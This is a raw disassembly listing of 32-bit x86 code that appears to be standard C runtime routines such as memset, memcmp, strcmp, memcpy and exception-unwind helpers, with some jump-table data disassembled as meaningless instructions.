  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
  426317:	push   DWORD PTR [esi+0x7c]
  42631a:	call   0x4244ba
  42631f:	add    esp,0x40
  426322:	push   DWORD PTR [esi+0x80]
  426328:	call   0x4244ba
  42632d:	push   DWORD PTR [esi+0x84]
  426333:	call   0x4244ba
  426338:	push   DWORD PTR [esi+0x88]
  42633e:	call   0x4244ba
  426343:	push   DWORD PTR [esi+0x8c]
  426349:	call   0x4244ba
  42634e:	push   DWORD PTR [esi+0x90]
  426354:	call   0x4244ba
  426359:	push   DWORD PTR [esi+0x94]
  42635f:	call   0x4244ba
  426364:	push   DWORD PTR [esi+0x98]
  42636a:	call   0x4244ba
  42636f:	push   DWORD PTR [esi+0x9c]
  426375:	call   0x4244ba
  42637a:	push   DWORD PTR [esi+0xa0]
  426380:	call   0x4244ba
  426385:	push   DWORD PTR [esi+0xa4]
  42638b:	call   0x4244ba
  426390:	push   DWORD PTR [esi+0xa8]
  426396:	call   0x4244ba
  42639b:	add    esp,0x2c
  42639e:	pop    esi
  42639f:	ret    
  4263a0:	push   esi
  4263a1:	mov    esi,DWORD PTR [esp+0x8]
  4263a5:	test   esi,esi
  4263a7:	je     0x4263fd
  4263a9:	mov    eax,DWORD PTR [esi]
  4263ab:	mov    ecx,DWORD PTR ds:0x45c934
  4263b1:	cmp    eax,DWORD PTR [ecx]
  4263b3:	je     0x4263c4
  4263b5:	cmp    eax,DWORD PTR ds:0x45c904
  4263bb:	je     0x4263c4
  4263bd:	push   eax
  4263be:	call   0x4244ba
  4263c3:	pop    ecx
  4263c4:	mov    eax,DWORD PTR [esi+0x4]
  4263c7:	mov    ecx,DWORD PTR ds:0x45c934
  4263cd:	cmp    eax,DWORD PTR [ecx+0x4]
  4263d0:	je     0x4263e1
  4263d2:	cmp    eax,DWORD PTR ds:0x45c908
  4263d8:	je     0x4263e1
  4263da:	push   eax
  4263db:	call   0x4244ba
  4263e0:	pop    ecx
  4263e1:	mov    esi,DWORD PTR [esi+0x8]
  4263e4:	mov    eax,ds:0x45c934
  4263e9:	cmp    esi,DWORD PTR [eax+0x8]
  4263ec:	je     0x4263fd
  4263ee:	cmp    esi,DWORD PTR ds:0x45c90c
  4263f4:	je     0x4263fd
  4263f6:	push   esi
  4263f7:	call   0x4244ba
  4263fc:	pop    ecx
  4263fd:	pop    esi
  4263fe:	ret    
  4263ff:	push   esi
  426400:	mov    esi,DWORD PTR [esp+0x8]
  426404:	test   esi,esi
  426406:	je     0x4264d6
  42640c:	mov    eax,DWORD PTR [esi+0xc]
  42640f:	mov    ecx,DWORD PTR ds:0x45c934
  426415:	cmp    eax,DWORD PTR [ecx+0xc]
  426418:	je     0x426429
  42641a:	cmp    eax,DWORD PTR ds:0x45c910
  426420:	je     0x426429
  426422:	push   eax
  426423:	call   0x4244ba
  426428:	pop    ecx
  426429:	mov    eax,DWORD PTR [esi+0x10]
  42642c:	mov    ecx,DWORD PTR ds:0x45c934
  426432:	cmp    eax,DWORD PTR [ecx+0x10]
  426435:	je     0x426446
  426437:	cmp    eax,DWORD PTR ds:0x45c914
  42643d:	je     0x426446
  42643f:	push   eax
  426440:	call   0x4244ba
  426445:	pop    ecx
  426446:	mov    eax,DWORD PTR [esi+0x14]
  426449:	mov    ecx,DWORD PTR ds:0x45c934
  42644f:	cmp    eax,DWORD PTR [ecx+0x14]
  426452:	je     0x426463
  426454:	cmp    eax,DWORD PTR ds:0x45c918
  42645a:	je     0x426463
  42645c:	push   eax
  42645d:	call   0x4244ba
  426462:	pop    ecx
  426463:	mov    eax,DWORD PTR [esi+0x18]
  426466:	mov    ecx,DWORD PTR ds:0x45c934
  42646c:	cmp    eax,DWORD PTR [ecx+0x18]
  42646f:	je     0x426480
  426471:	cmp    eax,DWORD PTR ds:0x45c91c
  426477:	je     0x426480
  426479:	push   eax
  42647a:	call   0x4244ba
  42647f:	pop    ecx
  426480:	mov    eax,DWORD PTR [esi+0x1c]
  426483:	mov    ecx,DWORD PTR ds:0x45c934
  426489:	cmp    eax,DWORD PTR [ecx+0x1c]
  42648c:	je     0x42649d
  42648e:	cmp    eax,DWORD PTR ds:0x45c920
  426494:	je     0x42649d
  426496:	push   eax
  426497:	call   0x4244ba
  42649c:	pop    ecx
  42649d:	mov    eax,DWORD PTR [esi+0x20]
  4264a0:	mov    ecx,DWORD PTR ds:0x45c934
  4264a6:	cmp    eax,DWORD PTR [ecx+0x20]
  4264a9:	je     0x4264ba
  4264ab:	cmp    eax,DWORD PTR ds:0x45c924
  4264b1:	je     0x4264ba
  4264b3:	push   eax
  4264b4:	call   0x4244ba
  4264b9:	pop    ecx
  4264ba:	mov    esi,DWORD PTR [esi+0x24]
  4264bd:	mov    eax,ds:0x45c934
  4264c2:	cmp    esi,DWORD PTR [eax+0x24]
  4264c5:	je     0x4264d6
  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
